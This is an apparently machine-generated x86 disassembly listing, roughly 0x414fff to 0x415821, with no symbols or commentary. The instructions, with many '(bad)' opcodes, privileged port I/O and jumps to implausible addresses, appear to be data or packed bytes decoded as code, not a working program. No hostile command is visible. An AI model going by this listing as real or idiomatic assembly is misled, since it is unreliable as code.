  414fff:	mov    BYTE PTR ds:0x7f30310a,bh
  415005:	mov    edi,0x271c08c9
  41500a:	mov    ebp,0x8a5110
  41500f:	daa    
  415010:	sbb    dl,BYTE PTR [ebp+0x7c]
  415013:	in     eax,dx
  415014:	and    BYTE PTR [eax-0x1ab2e92d],ch
  41501a:	es daa 
  41501c:	nop
  41501d:	mov    ds:0x34941f2f,eax
  415022:	sbb    ebp,DWORD PTR [esi+ecx*1+0x493a03e9]
  415029:	pushf  
  41502a:	clts   
  41502c:	xchg   esp,eax
  41502d:	and    BYTE PTR [esi],ah
  41502f:	test   DWORD PTR ds:0xfa0e1bb8,edx
  415035:	or     eax,0x493ef26
  41503a:	sbb    esp,DWORD PTR [edx+0xf]
  41503d:	jmp    0xe0d52e45
  415042:	sbb    esp,DWORD PTR [edx+0x0]
  415045:	out    dx,al
  415046:	and    eax,0x4dc9bb3
  41504b:	cmp    eax,0x436a50fb
  415050:	enter  0x24e8,0x3d
  415054:	adc    eax,0x93b19c0
  415059:	jmp    0xe3d63756
  41505e:	push   0x3e90931
  415063:	xchg   esi,eax
  415064:	xchg   ebx,eax
  415065:	mov    ah,0x1c
  415067:	adc    al,0xfa
  415069:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41506a:	and    eax,0x3b4145bb
  41506f:	jo     0x415075
  415071:	jmp    0x2cec5144
  415076:	cmp    ah,cl
  415078:	(bad)  
  415079:	mov    eax,0x1166c47f
  41507e:	cli    
  41507f:	add    dh,BYTE PTR [edx+0x19]
  415082:	push   DWORD PTR [ebp-0x7a]
  415085:	add    eax,ebp
  415087:	cmp    BYTE PTR [edx],bh
  415089:	sbb    bh,dh
  41508b:	ror    DWORD PTR [edx-0x5f],cl
  41508e:	or     BYTE PTR [ecx-0x2302e68d],dh
  415094:	cmp    ah,BYTE PTR [ecx]
  415096:	(bad)  
  415097:	repnz push ebp
  415099:	pop    ss
  41509a:	imul   esi,ecx,0xa847e2ca
  4150a0:	xor    bl,BYTE PTR [eax]
  4150a2:	je     0x415085
  4150a4:	cmp    ch,BYTE PTR [eax]
  4150a6:	sbb    ch,BYTE PTR [esi]
  4150a8:	push   esp
  4150a9:	pop    ss
  4150aa:	je     0x41509d
  4150ac:	sub    bl,BYTE PTR [ebx-0x4]
  4150af:	push   ds
  4150b0:	push   esp
  4150b1:	pusha  
  4150b2:	add    cl,ch
  4150b4:	xor    cl,BYTE PTR [ecx]
  4150b6:	leave  
  4150b7:	sub    esi,DWORD PTR [ecx]
  4150b9:	or     DWORD PTR [ebp+0x72],edx
  4150bc:	dec    ecx
  4150bd:	mov    eax,ebx
  4150bf:	add    DWORD PTR ds:0xa5067c1,eax
  4150c5:	fdivr  st,st(7)
  4150c7:	lock or BYTE PTR [ecx],0xc3
  4150cb:	out    0xd,al
  4150cd:	popf   
  4150ce:	or     ebx,esi
  4150d0:	(bad)  
  4150d1:	adc    al,ch
  4150d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150d4:	das    
  4150d5:	sbb    dh,bh
  4150d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150d8:	add    bh,ch
  4150da:	adc    al,0x0
  4150dc:	jmp    0x24ce5a13
  4150e1:	dec    ebp
  4150e2:	enter  0x8767,0xe1
  4150e6:	leave  
  4150e7:	inc    eax
  4150e9:	pmulhuw mm7,mm6
  4150ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150ed:	mov    DWORD PTR [eax+0x73],ebx
  4150f0:	retf   
  4150f1:	bound  ecx,QWORD PTR [ebx-0x61dd6e84]
  4150f7:	adc    eax,0xfeb94503
  4150fc:	add    BYTE PTR [ebp+0x20],ah
  4150ff:	out    0x38,al
  415101:	jg     0x4150f0
  415103:	std    
  415104:	or     ecx,DWORD PTR [eax+0x15c70568]
  41510a:	loope  0x41510a
  41510c:	call   FWORD PTR [eax+0xc]
  41510f:	call   0xfe2e8fd5
  415114:	mov    eax,DWORD PTR [ebp+0x10c2c7f0]
  41511a:	or     al,0x55
  41511c:	mov    edi,DWORD PTR [ecx+edi*1+0x4e]
  415120:	pop    eax
  415121:	add    dh,ah
  415123:	test   DWORD PTR [eax+0x8],0x5b0170e4
  41512a:	in     eax,dx
  41512b:	sub    ebx,ebx
  41512d:	dec    edi
  41512e:	addr16 push es
  415130:	call   0x3f3dfe
  415135:	adc    ecx,esp
  415137:	or     eax,0xc6684
  41513c:	add    BYTE PTR [eax],al
  41513e:	das    
  41513f:	addr16 push es
  415141:	call   0x4056f2
  415146:	ror    ebx,cl
  415148:	jae    0x41514f
  41514a:	xor    DWORD PTR [edx-0x15270002],edx
  415150:	jae    0x41515e
  415152:	fbstp  TBYTE PTR [ecx+0x6]
  415155:	call   0x3f3dc5
  41515a:	jg     0x4151cd
  41515c:	push   es
  41515d:	call   0x405b6b
  415162:	mov    ds:0x730273cb,eax
  415167:	jge    0x415166
  415169:	jne    0x4150fb
  41516b:	jecxz  0x41518e
  41516d:	sbb    al,0xcf
  41516f:	jmp    0x41517a
  415171:	shl    BYTE PTR ds:0x3163eb0f,0x7f
  415178:	cwde   
  415179:	pop    es
  41517a:	pop    ecx
  41517b:	cli    
  41517c:	(bad)  
  41517d:	(bad)  
  41517e:	data16 sbb al,BYTE PTR [edx+0x74]
  415182:	xor    edi,DWORD PTR [ebx-0x48]
  415185:	addr16 jmp esi
  415188:	(bad)  
  415189:	dec    DWORD PTR [edi+0x1c]
  41518c:	or     ch,al
  41518e:	jge    0x41519e
  415190:	and    edi,esi
  415192:	sub    ah,dl
  415194:	cwde   
  415195:	add    DWORD PTR [edx+0x63],ecx
  415198:	and    DWORD PTR [ecx+edi*1-0x38],esi
  41519c:	pop    ss
  41519d:	sbb    ah,BYTE PTR [esi]
  41519f:	ror    BYTE PTR [esi],1
  4151a1:	rol    BYTE PTR [eax],0xa4
  4151a4:	and    ch,BYTE PTR ds:0xa561633
  4151aa:	call   0xfe62962c
  4151af:	cmp    ah,al
  4151b1:	cwde   
  4151b2:	add    DWORD PTR [edx],ecx
  4151b4:	dec    edi
  4151b5:	and    DWORD PTR [ecx+ebp*1+0x8],esi
  4151b9:	sbb    edx,DWORD PTR [esi+ebp*8]
  4151bc:	pop    es
  4151bd:	xchg   edi,esi
  4151bf:	adc    DWORD PTR [edi+0x1bf12b04],edx
  4151c5:	inc    edx
  4151c6:	jae    0x41520a
  4151c8:	pop    ebp
  4151c9:	add    al,BYTE PTR [eax]
  4151cb:	and    DWORD PTR [eax],esp
  4151cd:	xchg   ebp,eax
  4151ce:	or     ecx,DWORD PTR [edx+0x31000221]
  4151d4:	cmp    eax,DWORD PTR [edi]
  4151d6:	mov    ebx,0x22032
  4151db:	mov    edx,0x73c8bd63
  4151e0:	sbb    BYTE PTR [edx],al
  4151e2:	push   ebp
  4151e3:	stos   BYTE PTR es:[edi],al
  4151e4:	inc    esp
  4151e5:	mov    dl,0x57
  4151e7:	or     DWORD PTR [ecx+0x58313f1c],ebx
  4151ed:	xchg   esp,eax
  4151ee:	add    BYTE PTR [edx+0x9],dh
  4151f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151f2:	and    al,BYTE PTR ds:0x2e989e05
  4151f8:	and    edx,ecx
  4151fa:	and    ch,BYTE PTR [edi+0x16]
  4151fd:	loope  0x415242
  4151ff:	(bad)  
  415201:	test   DWORD PTR [eax+0xbf3162a],ebx
  415207:	add    BYTE PTR [ecx-0x6],cl
  41520a:	jne    0x41522e
  41520c:	dec    edi
  41520d:	add    ch,BYTE PTR [ecx-0x24e9c468]
  415213:	(bad)  
  415215:	pushf  
  415216:	lock sub esi,DWORD PTR [edx]
  415219:	push   ss
  41521a:	push   ebp
  41521b:	and    bh,cl
  41521d:	dec    edx
  41521e:	loopne 0x415223
  415220:	jl     0x4151a4
  415222:	push   esp
  415223:	xchg   dl,dh
  415225:	sub    al,0x99
  415227:	mov    edx,0x1dc0b166
  41522c:	or     cl,cl
  41522e:	call   0x2a49d24e
  415233:	and    cl,BYTE PTR [ebx+0x32]
  415236:	adc    dh,bl
  415238:	jae    0x415250
  41523a:	adc    eax,0xe825754a
  41523f:	add    esi,DWORD PTR [ecx]
  415241:	or     DWORD PTR [eax+ecx*8-0x36],esi
  415245:	mov    eax,0x16423210
  41524a:	cmc    
  41524b:	test   DWORD PTR [ebp+0x25],ecx
  41524e:	call   0x2bc570eb
  415253:	xor    BYTE PTR [esi+0x21],ch
  415256:	enter  0xb7f8,0x15
  41525a:	imul   ebx,DWORD PTR [edi+0xb54089a],0xb4d4cbb4
  415264:	xchg   esi,eax
  415265:	aaa    
  415266:	aam    0x20
  415268:	xchg   edi,eax
  415269:	mov    edi,edi
  41526b:	xor    eax,DWORD PTR [eax]
  41526d:	inc    ecx
  41526e:	push   ss
  41526f:	or     eax,0xfe15a365
  415274:	jmp    0x3a311f28
  415279:	push   eax
  41527a:	popf   
  41527b:	jmp    0x4151fe
  41527d:	xchg   esi,eax
  41527e:	push   ss
  41527f:	dec    BYTE PTR [esi-0x3ffe254]
  415285:	mov    edi,0x72266156
  41528a:	adc    eax,0xccf810e9
  41528f:	jecxz  0x415274
  415291:	xor    cl,BYTE PTR [ecx]
  415293:	add    BYTE PTR [esi],ch
  415295:	jbe    0x4152c4
  415297:	(bad)  
  415298:	call   0xacce5bcf
  41529d:	pop    edx
  41529e:	(bad)  
  41529f:	(bad)  
  4152a0:	aam    0x56
  4152a2:	mov    ebx,0x13f4d5e7
  4152a7:	(bad)  
  4152a8:	bnd jb 0x415243
  4152ab:	punpckhdq mm5,QWORD PTR [esi+0x34b4ff2c]
  4152b2:	adc    al,0x74
  4152b4:	adc    DWORD PTR [ebp-0x1d],ecx
  4152b7:	cld    
  4152b8:	push   ds
  4152b9:	push   eax
  4152ba:	jg     0x415293
  4152bc:	push   ss
  4152bd:	(bad)  
  4152be:	sub    al,0xe7
  4152c0:	jbe    0x4152ab
  4152c2:	adc    edi,esi
  4152c4:	repnz sbb eax,0xb66a149d
  4152ca:	sub    bh,bh
  4152cc:	jl     0x4152ef
  4152ce:	adc    al,0x4c
  4152d0:	add    eax,0x128c9500
  4152d5:	jmp    0xf219740c
  4152da:	xor    cl,BYTE PTR [ecx]
  4152dc:	jmp    0x41527c
  4152de:	pop    ebp
  4152df:	or     DWORD PTR [edi+0x69],eax
  4152e2:	xchg   ecx,eax
  4152e3:	adc    al,0x73
  4152e5:	add    BYTE PTR [edx+0x41],dh
  4152e8:	jle    0x415329
  4152ea:	mov    BYTE PTR [edx+eax*1+0xb],bh
  4152ee:	mov    ds:0xa30b9c7c,eax
  4152f3:	jl     0x415303
  4152f5:	push   0x78
  4152f7:	add    DWORD PTR [ebx-0x10],0x38
  4152fb:	lods   al,BYTE PTR gs:[esi]
  4152fd:	jae    0x415318
  4152ff:	or     eax,0xe9715de8
  415304:	std    
  415305:	call   FWORD PTR [ebp-0x1c]
  415308:	out    0x50,al
  41530a:	jl     0x4152f5
  41530c:	std    
  41530d:	mov    ebx,DWORD PTR [ebx-0x6436a6b7]
  415313:	pop    ebx
  415314:	mov    esp,ebp
  415316:	leave  
  415317:	retf   
  415318:	sahf   
  415319:	(bad)  
  41531a:	xlat   BYTE PTR ds:[ebx]
  41531b:	call   0x5029a975
  415320:	data16 in al,dx
  415322:	or     DWORD PTR [eax-0x2],0xfffffff7
  415326:	fiadd  DWORD PTR [esi]
  415328:	ret    
  415329:	call   DWORD PTR [edi+0x18414583]
  41532f:	mov    BYTE PTR ds:0xc98be700,bh
  415335:	add    DWORD PTR [eax],eax
  415337:	or     BYTE PTR [eax],cl
  415339:	lea    eax,[ebp-0x215e4]
  41533f:	test   al,0x50
  415341:	out    0xa7,al
  415343:	imul   eax
  415345:	std    
  415346:	or     ecx,DWORD PTR [eax]
  415348:	stc    
  415349:	and    DWORD PTR [ecx+ecx*8+0x5830007],0xfffffffc
  415351:	cld    
  415352:	call   edi
  415354:	push   es
  415355:	je     0x41619a
  41535b:	inc    ebp
  41535c:	and    BYTE PTR [esi+0x1e3b31fe],0x4f
  415363:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415364:	jl     0x41537d
  415366:	std    
  415367:	sahf   
  415368:	dec    edx
  415369:	sub    eax,DWORD PTR [ecx+0x3a]
  41536c:	push   ebx
  41536d:	push   ds
  41536e:	sub    al,BYTE PTR [edi-0x785ca758]
  415374:	bound  ebx,QWORD PTR [esi]
  415376:	jmp    0x43ad:0xb60d3446
  41537d:	push   0xfffffffd
  41537f:	outs   dx,BYTE PTR ds:[esi]
  415380:	jp     0x415335
  415382:	addr16 sub esi,0xffffffc4
  415386:	jmp    FWORD PTR [ebp+0x56fd41a4]
  41538c:	xchg   edx,eax
  41538d:	mov    bl,0xe7
  41538f:	(bad)  
  415390:	sub    DWORD PTR [edx],eax
  415392:	add    BYTE PTR [edx-0x4b72f093],dh
  415398:	fistp  WORD PTR ds:0x513600fe
  41539e:	sbb    eax,0x1ebad5b4
  4153a3:	(bad)  
  4153a4:	sbb    DWORD PTR [eax],ecx
  4153a6:	in     al,0xfe
  4153a8:	push   ds
  4153a9:	call   0x451e:0xd417a388
  4153b0:	mov    dl,0xda
  4153b2:	repz jno 0x4153a2
  4153b5:	jecxz  0x41540f
  4153b7:	repz (bad) 
  4153b9:	jmp    0x4153d9
  4153bb:	out    0x4b,eax
  4153bd:	sbb    bl,BYTE PTR ds:0x5ba5f6fe
  4153c3:	std    
  4153c4:	out    0x3,al
  4153c6:	add    al,0x0
  4153c8:	xor    DWORD PTR [eax],esp
  4153ca:	test   al,0x1
  4153cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153cd:	lods   eax,DWORD PTR ds:[esi]
  4153ce:	pop    ebx
  4153cf:	std    
  4153d0:	into   
  4153d1:	sbb    esi,DWORD PTR [edx+0x1c1c7cfe]
  4153d7:	(bad)  
  4153d8:	mov    esi,0x228fd109
  4153dd:	adc    bl,ch
  4153df:	or     dh,BYTE PTR [ecx+0x2]
  4153e2:	ins    DWORD PTR es:[edi],dx
  4153e3:	sbb    esp,DWORD PTR [esi-0x227b17ee]
  4153e9:	push   ecx
  4153ea:	(bad)  
  4153eb:	push   ds
  4153ec:	xchg   edi,eax
  4153ed:	les    esp,FWORD PTR [edx]
  4153ef:	add    al,0x31
  4153f1:	add    ch,BYTE PTR [ebx+ebp*1-0x7a]
  4153f5:	adc    ch,al
  4153f7:	nop
  4153f8:	mov    ch,0xe
  4153fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153fb:	push   ds
  4153fc:	ja     0x4153b7
  4153fe:	adc    BYTE PTR [eax],cl
  415400:	add    BYTE PTR [eax],dh
  415402:	or     ecx,ebp
  415404:	sub    edi,DWORD PTR [eax]
  415406:	or     ch,cl
  415408:	add    ebp,DWORD PTR [edx]
  41540a:	dec    ecx
  41540b:	cmc    
  41540c:	xchg   DWORD PTR [edi+0x9],esp
  41540f:	jmp    0xe84e6017
  415414:	add    esi,DWORD PTR [ecx]
  415416:	add    ah,BYTE PTR [esi+0x47]
  415419:	ds adc ch,al
  41541c:	sub    esp,DWORD PTR [edx-0x7efc16f6]
  415422:	mov    eax,ds:0x9719221
  415427:	pop    esp
  415428:	mov    al,dh
  41542a:	adc    al,BYTE PTR [ebp+0x1e]
  41542d:	and    WORD PTR [edx],si
  415430:	push   es
  415431:	xor    DWORD PTR [ecx],ecx
  415433:	push   0x47
  415435:	cmp    bl,BYTE PTR [edi+0xdb590e8]
  41543b:	es push ds
  41543d:	idiv   DWORD PTR [eax+0x9343810]
  415443:	jmp    0xe4f01d8
  415448:	push   ds
  415449:	fistp  QWORD PTR [eax+0x120c2210]
  41544f:	std    
  415450:	or     ecx,esi
  415452:	fwait
  415453:	dec    eax
  415455:	call   0x8484:0x32a84777
  41545c:	loop   0x415475
  41545e:	adc    edi,esi
  415460:	cmp    DWORD PTR [ebp-0xb],ebx
  415463:	push   ds
  415464:	(bad)  
  415465:	add    BYTE PTR [ebp+eax*4-0x6c],al
  415469:	stos   DWORD PTR es:[edi],eax
  41546a:	aas    
  41546b:	adc    edi,esi
  41546d:	sbb    ebx,ebp
  41546f:	sub    DWORD PTR [ebx-0x22],esp
  415472:	sub    eax,0xb7daea13
  415477:	mov    ecx,es
  415479:	scas   eax,DWORD PTR es:[edi]
  41547a:	sbb    al,0x13
  41547c:	dec    edi
  41547d:	je     0x41542d
  41547f:	push   cs
  415480:	std    
  415481:	sahf   
  415482:	dec    esp
  415483:	ret    0x92e7
  415486:	addr16 adc bh,dh
  415489:	pusha  
  41548a:	mov    dh,0x4d
  41548c:	std    
  41548d:	xchg   BYTE PTR [ebx+edx*1],dh
  415490:	mov    ah,0x3d
  415492:	das    
  415493:	adc    edi,esi
  415495:	jbe    0x415475
  415497:	adc    eax,0x2a1c6efd
  41549c:	out    dx,eax
  41549d:	call   DWORD PTR ds:0xc9290a13
  4154a3:	(bad)  [edi+0x3e]
  4154a6:	ror    cl,0xff
  4154a9:	inc    eax
  4154aa:	cs pop es
  4154ac:	add    cl,ch
  4154ae:	loop   0x415458
  4154b0:	(bad)  
  4154b1:	mov    edx,0x7cfd10f3
  4154b6:	cdq    
  4154b7:	push   cs
  4154b8:	(bad)  
  4154b9:	cs dec ebp
  4154bb:	bound  esp,QWORD PTR [esi]
  4154bd:	es adc al,0xa2
  4154c0:	add    BYTE PTR [ebx+0x15ffa332],dl
  4154c6:	jle    0x41551c
  4154c8:	std    
  4154c9:	push   cs
  4154ca:	add    BYTE PTR [eax+ebp*4],bh
  4154cd:	mov    al,0x0
  4154cf:	mov    al,ds:0xd869fe4b
  4154d4:	in     al,0x6e
  4154d6:	pop    es
  4154d7:	fmul   DWORD PTR [edi+edi*8]
  4154da:	mov    ch,0xc
  4154dc:	out    dx,eax
  4154dd:	std    
  4154de:	jmp    eax
  4154e0:	or     DWORD PTR [ebx],ebx
  4154e2:	dec    DWORD PTR [edi+0x7ea4b3ed]
  4154e8:	in     eax,dx
  4154e9:	std    
  4154ea:	call   0x3e676f
  4154ef:	outs   dx,DWORD PTR ds:[esi]
  4154f0:	mov    bh,0xf2
  4154f2:	dec    bh
  4154f4:	in     eax,dx
  4154f5:	out    0x6c,al
  4154f7:	push   0xffffffed
  4154f9:	std    
  4154fa:	cld    
  4154fb:	jnp    0x4154c9
  4154fd:	mov    bh,0xff
  4154ff:	iret   
  415500:	in     eax,dx
  415501:	std    
  415502:	repnz (bad) 
  415504:	xor    eax,DWORD PTR ds:0xfc36d50f
  41550a:	jmp    FWORD PTR [edi-0x7436a2b2]
  415510:	push   edi
  415511:	mov    esp,ebp
  415513:	fcmovnb st,st(7)
  415515:	out    dx,al
  415516:	push   eax
  415517:	and    BYTE PTR [ebp-0x27],bl
  41551a:	std    
  41551b:	or     BYTE PTR ds:0xc94972f8,al
  415521:	std    
  415522:	mov    ebp,DWORD PTR [edx-0x64]
  415525:	add    ax,0xc19
  415529:	add    al,ch
  41552b:	aas    
  41552c:	adc    bh,ch
  41552e:	inc    DWORD PTR [eax]
  415530:	js     0x4154b3
  415532:	rcl    BYTE PTR [eax-0x6f05b87f],1
  415538:	xchg   ebx,eax
  415539:	fimul  DWORD PTR [esi+0xb1568]
  41553f:	add    BYTE PTR [eax],ah
  415541:	mov    dl,0x18
  415543:	dec    DWORD PTR [edi-0x64]
  415546:	mov    edx,edx
  415548:	xor    DWORD PTR [ecx-0x763e103b],ebp
  41554e:	add    eax,0x2a223101
  415553:	test   al,0x2b
  415555:	bndldx bnd1,[edx-0x2e784e1d]
  41555c:	test   al,0x64
  41555e:	sbb    cl,BYTE PTR [edx-0x70ca651d]
  415564:	sbb    DWORD PTR [esi],esp
  415566:	add    eax,DWORD PTR [eax]
  415568:	xor    DWORD PTR [edi],esi
  41556a:	nop
  41556b:	sti    
  41556c:	or     esp,DWORD PTR [edx]
  41556e:	sub    dl,BYTE PTR [ebx+0x2f]
  415571:	and    al,BYTE PTR [edx]
  415573:	nop
  415574:	mov    edx,0x86d18e73
  415579:	int3   
  41557a:	adc    esp,DWORD PTR [edi+0x35]
  41557d:	and    DWORD PTR [edx],eax
  41557f:	add    BYTE PTR [ecx+0x3100008d],cl
  415585:	sbb    eax,DWORD PTR [edx+0x73]
  415588:	inc    ecx
  415589:	stos   DWORD PTR es:[edi],eax
  41558a:	xor    eax,0x968bc98f
  41558f:	inc    eax
  415590:	xor    DWORD PTR [edi+0x5900ef90],eax
  415596:	fild   DWORD PTR [eax]
  415598:	add    BYTE PTR [ecx],dh
  41559a:	stos   DWORD PTR es:[edi],eax
  41559b:	xor    eax,0x40c3169
  4155a0:	push   0x33
  4155a2:	cmp    al,0x2
  4155a4:	push   0x32
  4155a6:	cmp    BYTE PTR [edx],al
  4155a8:	add    BYTE PTR [ecx],dh
  4155aa:	loopne 0x4155c6
  4155ac:	je     0x4155cf
  4155ae:	leave  
  4155af:	adc    BYTE PTR [ebx],al
  4155b1:	xor    DWORD PTR [eax],esp
  4155b3:	mov    eax,DWORD PTR [ebp+eax*1+0x61]
  4155b7:	or     eax,0x195c7cc0
  4155bc:	je     0x4155bb
  4155be:	fist   WORD PTR [eax+0x10a09ef]
  4155c4:	add    DWORD PTR [ecx],esi
  4155c6:	or     DWORD PTR [ebx+0x160958b7],edx
  4155cc:	xchg   ecx,eax
  4155cd:	into   
  4155ce:	and    DWORD PTR [edx+0x2],edi
  4155d1:	xor    DWORD PTR [ecx],ecx
  4155d3:	repnz inc ebx
  4155d5:	inc    edx
  4155d6:	std    
  4155d7:	test   al,0xab
  4155d9:	fcomp  DWORD PTR [edx+0x216103a7]
  4155df:	in     al,dx
  4155e0:	push   DWORD PTR [esi+0x1b04520e]
  4155e6:	or     DWORD PTR [ebx+0x6],edx
  4155e9:	sbb    ecx,DWORD PTR [ecx]
  4155eb:	inc    ebx
  4155ec:	pop    es
  4155ed:	or     DWORD PTR [ecx],ecx
  4155ef:	jmp    0x3b4fc6f7
  4155f4:	adc    al,0x96
  4155f6:	pop    esi
  4155f7:	in     al,0x3
  4155f9:	add    BYTE PTR [ecx],dh
  4155fb:	sub    BYTE PTR [ebx],0x10
  4155fe:	ds xchg ebp,eax
  415600:	inc    ecx
  415601:	lods   al,BYTE PTR ds:[esi]
  415602:	sbb    DWORD PTR [edx+0x56590427],0xffffffe4
  415609:	add    esi,DWORD PTR [ecx]
  41560b:	mov    ecx,0xc7e31700
  415610:	call   0x9056332f
  415615:	fsub   DWORD PTR ds:0x47b37d0e
  41561b:	xchg   esp,eax
  41561c:	jl     0x415649
  41561e:	mov    ds:0xd903e905,al
  415623:	add    DWORD PTR [ecx],ebp
  415625:	nop
  415626:	xor    BYTE PTR [edx],ah
  415628:	test   eax,0xc00d9d1a
  41562d:	fisub  DWORD PTR [edx-0x62e51738]
  415633:	adc    DWORD PTR [eax+0x48],edx
  415636:	xor    eax,0xf286e909
  41563b:	cld    
  41563c:	inc    eax
  41563e:	out    dx,eax
  41563f:	cdq    
  415640:	inc    eax
  415641:	jmp    0xe9449690
  415646:	xor    al,BYTE PTR [edx]
  415648:	rcl    BYTE PTR [ebp-0x65245a34],0xf5
  41564f:	or     eax,0xa6d014e
  415654:	add    cl,ch
  415656:	aas    
  415657:	dec    ecx
  415658:	jae    0x415634
  41565a:	xchg   esp,eax
  41565b:	or     eax,0x1b00e968
  415660:	xchg   ebp,eax
  415661:	imul   esi
  415663:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415664:	sbb    eax,0xc87d9867
  415669:	call   DWORD PTR [edx+0x2d]
  41566c:	push   cs
  41566d:	iret   
  41566e:	(bad)  
  41566f:	scas   al,BYTE PTR es:[edi]
  415670:	adc    edi,esp
  415672:	push   ecx
  415673:	call   0xe71d:0xbec6fe0e
  41567a:	cmp    DWORD PTR [edx-0x514901f2],ecx
  415680:	adc    eax,0xe7a41e7
  415685:	(bad)  
  415686:	mov    al,0xf4
  415688:	mov    ah,0x8a
  41568a:	lea    ebp,[ecx+ecx*2-0x4a5ac521]
  415691:	addr16 sbb al,0x38
  415694:	into   
  415695:	inc    DWORD PTR [eax+0x7ec308a7]
  41569b:	lods   al,BYTE PTR ds:[esi]
  41569c:	int3   
  41569d:	inc    ebx
  41569e:	and    dh,BYTE PTR [edx+0xd]
  4156a1:	(bad)  
  4156a2:	cmc    
  4156a3:	sub    ecx,DWORD PTR [edx-0x360256c4]
  4156a9:	(bad)  
  4156aa:	call   0x296c5c66
  4156af:	fadd   QWORD PTR [ecx-0x3e]
  4156b2:	es (bad) 
  4156b4:	adc    bh,bh
  4156b6:	call   FWORD PTR [eax]
  4156b8:	or     DWORD PTR [eax],eax
  4156ba:	(bad)  
  4156bb:	int    0xf0
  4156bd:	(bad)  
  4156be:	dec    DWORD PTR [eax]
  4156c0:	or     edi,eax
  4156c2:	inc    ebp
  4156c3:	add    BYTE PTR [eax*1-0x36280000],dh
  4156ca:	inc    ebx
  4156cb:	hlt    
  4156cc:	fmul   DWORD PTR [eax]
  4156ce:	add    BYTE PTR [eax],al
  4156d0:	cmovl  ebp,esi
  4156d3:	add    al,cl
  4156d5:	or     BYTE PTR [eax],al
  4156d7:	lea    ebx,[ebp-0x7272b108]
  4156dd:	cld    
  4156de:	dec    esi
  4156df:	lea    ecx,[ebp-0x3895b11c]
  4156e5:	add    DWORD PTR [ebx-0x4],0x68
  4156e9:	pop    ebx
  4156ea:	add    BYTE PTR [edx-0x65],ch
  4156ed:	pop    esi
  4156ee:	(bad)  
  4156ef:	(bad)  
  4156f0:	popf   
  4156f1:	dec    esp
  4156f2:	dec    ecx
  4156f3:	inc    ecx
  4156f4:	mov    BYTE PTR [edi+0x43],bh
  4156f7:	call   0x127ca17
  4156fc:	cmp    al,0x0
  4156fe:	cmp    DWORD PTR [ebp+0x70],0x88fffede
  415705:	jnp    0x415779
  415707:	dec    DWORD PTR [ebp-0xf]
  41570a:	lea    eax,[ebp-0x70]
  41570d:	test   DWORD PTR [ebx-0x8],edi
  415710:	dec    eax
  415711:	jl     0x41576b
  415713:	mov    eax,DWORD PTR ds:0xb73fe9ed
  415719:	jne    0x415781
  41571b:	call   0x3e7699
  415720:	ror    DWORD PTR [edx-0x22],1
  415723:	(bad)  
  415724:	jnp    0x415706
  415726:	adc    eax,0xf1970029
  41572b:	or     eax,eax
  41572d:	cld    
  41572e:	and    al,0x87
  415730:	inc    ebp
  415731:	xor    DWORD PTR [esi-0x14f6f454],edi
  415737:	cli    
  415738:	dec    BYTE PTR [esi]
  41573a:	ret    
  41573b:	(bad)  
  41573c:	fbstp  TBYTE PTR [esi-0x7b00f59f]
  415742:	mov    esi,0xdb2d3f87
  415747:	int    0xa5
  415749:	bound  esp,QWORD PTR [ecx+0x2]
  41574c:	(bad)  
  41574d:	xor    DWORD PTR [edi+0x22707260],edi
  415753:	add    edx,0x5d
  415756:	sti    
  415757:	(bad)
  41575a:	test   BYTE PTR [esi],ah
  41575c:	(bad)  
  41575d:	cmp    eax,0xbd7417c7
  415762:	adc    ch,ah
  415764:	aas    
  415765:	push   0x61
  415767:	add    al,bh
  415769:	hlt    
  41576a:	and    eax,0x22310003
  41576f:	cmp    DWORD PTR [ecx+ecx*4+0x47],0x3
  415774:	add    BYTE PTR [ecx],dh
  415776:	mov    ch,0x0
  415778:	jmp    0xfe579a6a
  41577d:	mov    dl,0xcc
  41577f:	pop    ss
  415780:	inc    DWORD PTR [edx]
  415782:	sub    DWORD PTR ds:0xf05a7574,edx
  415788:	aas    
  415789:	cli    
  41578a:	loopne 0x41578f
  41578c:	mov    eax,0x2223000
  415791:	add    dl,bh
  415793:	push   0x8daa5442
  415798:	add    bl,0x65
  41579b:	out    dx,al
  41579c:	scas   al,BYTE PTR es:[edi]
  41579d:	dec    edi
  41579e:	jmp    0xf241059c
  4157a3:	and    DWORD PTR [edx],ebx
  4157a5:	jno    0x4157d7
  4157a7:	pop    edi
  4157a8:	push   ss
  4157a9:	sub    BYTE PTR [ecx+ecx*1-0x1f],0xca
  4157ae:	jno    0x4157b9
  4157b0:	jmp    0x13c78144
  4157b5:	sub    BYTE PTR [ebx-0x38],0xe8
  4157b9:	add    eax,DWORD PTR [ebx+eax*1-0x5198bbee]
  4157c0:	das    
  4157c1:	inc    ebx
  4157c2:	stos   DWORD PTR es:[edi],eax
  4157c3:	in     al,dx
  4157c4:	mov    ss,WORD PTR [ebx+0x75400971]
  4157ca:	xor    DWORD PTR [ecx],ecx
  4157cc:	jmp    0x1e221afc
  4157d1:	pop    ss
  4157d2:	mov    bl,0xcc
  4157d4:	inc    edx
  4157d5:	xchg   ebx,eax
  4157d6:	jno    0x4157e1
  4157d8:	jmp    0x794b7f6c
  4157dd:	inc    edi
  4157df:	aam    0x52
  4157e1:	xchg   ebx,eax
  4157e2:	jno    0x4157ed
  4157e4:	add    DWORD PTR [ebx+0xae90933],eax
  4157ea:	jno    0x415780
  4157ec:	jmp    0x41581a
  4157ee:	sbb    BYTE PTR [eax],cl
  4157f0:	jmp    0xc4b757f8
  4157f5:	aam    0x3
  4157f7:	xor    DWORD PTR [ecx],ecx
  4157f9:	jmp    0x184e4d86
  4157fe:	stos   BYTE PTR es:[edi],al
  4157ff:	xchg   BYTE PTR [eax+0x50316ea],ah
  415805:	inc    ebx
  415806:	add    al,0x76
  415808:	xchg   esi,eax
  415809:	in     al,0x16
  41580b:	inc    ebp
  41580c:	test   DWORD PTR [ecx],esi
  41580e:	lds    esp,FWORD PTR [esi-0x1]
  415811:	test   al,0x8f
  415813:	xor    eax,0x31035f20
  415818:	or     DWORD PTR [esi+0x60213292],ecx
  41581e:	fiadd  WORD PTR [edi+0xa]
  415821:	outs   dx,DWORD PTR ds:[esi]
